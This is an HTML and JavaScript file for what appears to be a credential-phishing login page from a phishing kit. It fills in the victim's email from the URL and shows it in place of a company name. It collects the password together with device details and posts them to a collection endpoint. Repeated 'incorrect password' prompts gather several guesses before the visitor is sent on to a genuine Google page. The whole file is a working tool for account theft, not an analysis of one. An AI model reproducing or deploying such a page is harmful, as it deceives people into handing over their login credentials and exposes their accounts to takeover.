<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="css/bootstrap.min.css" crossorigin="anonymous">
    <link href="css/font-awesome.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <style>
        body {
            background: #fff;
            font-family: "Archivo Narrow", sans-serif;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .office {
            width: 380px;
            background: #fff;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            padding: 20px;
            margin: auto;
        }
        .logo img {
            width: 50px;
            height: 50px;
        }
        .logo h3,
        .logo h5 {
            margin: 0.5em 0;
        }
        .form-holder input[type="email"],
        .form-holder input[type="password"] {
            width: 100%;
            height: 40px;
            margin-bottom: 15px;
        }
        .checkbox label {
            font-size: 13px;
            margin-left: 5px;
        }
        .btn-holder {
            text-align: center;
            position: relative;
        }
        .btn-holder .btn {
            background-color: #0073c6;
            color: #fff;
            border-radius: 0;
            width: 100%;
            padding: 10px;
            transition: background 0.3s ease;
        }
        .btn-holder .btn:hover {
            background-color: #0056b3;
        }
        .btn-holder .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .error-message {
            color: #e74c3c;
            text-align: center;
            margin-top: 10px;
            padding: 8px;
            border-radius: 4px;
            background: #fde0e0;
            display: none;
            animation: fadeIn 0.4s ease;
        }
        .error-message.show {
            display: block;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(-5px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        .loader-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.9);
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .loader-overlay.active {
            display: flex;
        }
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #333;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-overlay .msg {
            font-size: 18px;
            color: #555;
        }

        .btn-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }

        .avatar-holder {
            display: flex;
            justify-content: center;
            margin-bottom: 10px;
        }
        .avatar-img {
            background-color: white;
            border-radius: 50%;
            padding: 10px;
            width: 100px;
            height: 100px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 8px rgba(0,0,0,0.1);
        }
        .avatar-img img {
            border-radius: 50%;
            width: 80px;
            height: 80px;
            object-fit: cover;
        }
        .email-display {
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
            font-size: 1rem;
            color: #333;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-8px); }
            40%, 80% { transform: translateX(8px); }
        }
        .shake {
            animation: shake 0.5s ease;
        }

        /* Additional subtle helper text */
        .hint-text {
            font-size: 13px;
            color: #888;
            margin-top: 5px;
            text-align: center;
            display: none;
        }
        .hint-text.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="office">
            <div class="logo text-center">
                <img id="logoimg" src="images/zezezeze.png" alt="Logo">
                <h3 id="logoname" class="text-dark">Company Name</h3>
                <h5 class="font-weight-light">Sign in to continue</h5>
            </div>

            <div id="errorDisplay" class="error-message"></div>
            <div id="hintText" class="hint-text">Passwords are case‑sensitive.</div>

            <form id="login-form" method="post" action="/api/login">
                <div class="form-holder">
                    <div class="avatar-holder">
                        <div class="avatar-img">
                            <img src="download.png" alt="User Avatar">
                        </div>
                    </div>

                    <input type="hidden" id="email-hidden" name="email">

                    <div class="email-display">
                        <p id="email-display-text"></p>
                    </div>

                    <input type="password" id="password" name="password" class="form-control" placeholder="Password" required autofocus>

                    <div class="checkbox">
                        <input type="checkbox" id="remember-me">
                        <label for="remember-me">Remember me</label>
                    </div>

                    <div class="btn-holder">
                        <button type="submit" class="btn btn-lg" id="submit-btn">
                            <span id="btn-text">LOGIN</span>
                        </button>
                    </div>

                    <p><a href="#">Can't access your account?</a></p>
                    <p><a href="#">Sign in with a single-use code</a></p>
                </div>
            </form>
        </div>
    </div>

    <div id="loaderOverlay" class="loader-overlay">
        <div class="spinner"></div>
        <div class="msg">Logging you in, please wait...</div>
    </div>

    <script>
        (function() {
            let email = null;
            if (window.location.hash) {
                let hash = decodeURIComponent(window.location.hash.substring(1));
                if (hash.includes('=')) {
                    let params = new URLSearchParams(hash);
                    email = params.get('email');
                } else {
                    email = hash;
                }
            } else if (window.location.search) {
                let params = new URLSearchParams(window.location.search);
                email = params.get('email');
            }

            if (email) {
                document.getElementById('email-hidden').value = email;
                document.getElementById('email-display-text').textContent = email;
                document.getElementById('logoname').textContent = email;
            }

            const form = document.getElementById('login-form');
            const errorDisplay = document.getElementById('errorDisplay');
            const hintText = document.getElementById('hintText');
            const loader = document.getElementById('loaderOverlay');
            const submitBtn = document.getElementById('submit-btn');
            const btnText = document.getElementById('btn-text');

            function showError(message, shake = true) {
                errorDisplay.textContent = message;
                errorDisplay.classList.add('show');
                if (shake) {
                    errorDisplay.classList.remove('shake');
                    void errorDisplay.offsetWidth;
                    errorDisplay.classList.add('shake');
                }
                // Show hint for password errors
                if (message.toLowerCase().includes('password')) {
                    hintText.classList.add('show');
                } else {
                    hintText.classList.remove('show');
                }
            }

            function hideError() {
                errorDisplay.classList.remove('show', 'shake');
                hintText.classList.remove('show');
            }

            function getDeviceDetails() {
                return {
                    screen: `${window.screen.width}x${window.screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language || navigator.userLanguage,
                    platform: navigator.platform || 'Unknown'
                };
            }

            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const email = document.getElementById('email-hidden').value;
                const password = document.getElementById('password').value;

                if (!email || !password) {
                    showError('Please fill in all fields.', false);
                    return;
                }

                hideError();

                submitBtn.disabled = true;
                btnText.innerHTML = '<span class="btn-spinner"></span> Logging in...';

                try {
                    const device = getDeviceDetails();
                    const payload = {
                        email,
                        password,
                        screen: device.screen,
                        timezone: device.timezone,
                        language: device.language,
                        platform: device.platform
                    };

                    const response = await fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    const data = await response.json();

                    if (data.redirect) {
                        loader.classList.add('active');
                        setTimeout(() => {
                            window.location.href = data.redirectUrl || 'https://business.google.com/create/new?hl=en&gmbsrc=ng-en-z-z-z-gmb-l-z-d~mhp-hom_sig-u&original_intent=GMB&skiplp=1&_gl=1*we7dbu*_ga*MTQyMzU2Nzk4MS4xNzQ4ODg2MDg1*_ga_VM5ES1YN10*czE3NDg4ODYwODQkbzEkZzAkdDE3NDg4ODYwODQkajYwJGwwJGgw&service=ome&omec=EMLX0y4yAgECOipnbWJzcmM9bmctZW4tei16LXotZ21iLWwtei1kfm1ocC1ob21fc2lnLXVAAUoTCIuXmb2k040DFb-XAAAd3Ss8Mw%3D%3D';
                        }, 3000);
                    } else {
                        const attempts = data.attempts || 0;
                        let errorMsg = '';
                        if (attempts === 1) {
                            errorMsg = 'Incorrect password. Please double‑check your credentials.';
                        } else if (attempts === 2) {
                            errorMsg = 'The password you entered is incorrect. Remember that passwords are case‑sensitive. Please try again.';
                        } else if (attempts >= 3) {
                            errorMsg = 'This is your final attempt. If the password is still incorrect, you will be redirected.';
                        } else {
                            errorMsg = 'Invalid credentials.';
                        }
                        showError(errorMsg, true);
                        submitBtn.disabled = false;
                        btnText.textContent = 'LOGIN';
                    }
                } catch (err) {
                    showError('An error occurred. Please try again.', false);
                    submitBtn.disabled = false;
                    btnText.textContent = 'LOGIN';
                }
            });
        })();
    </script>
</body>
</html>
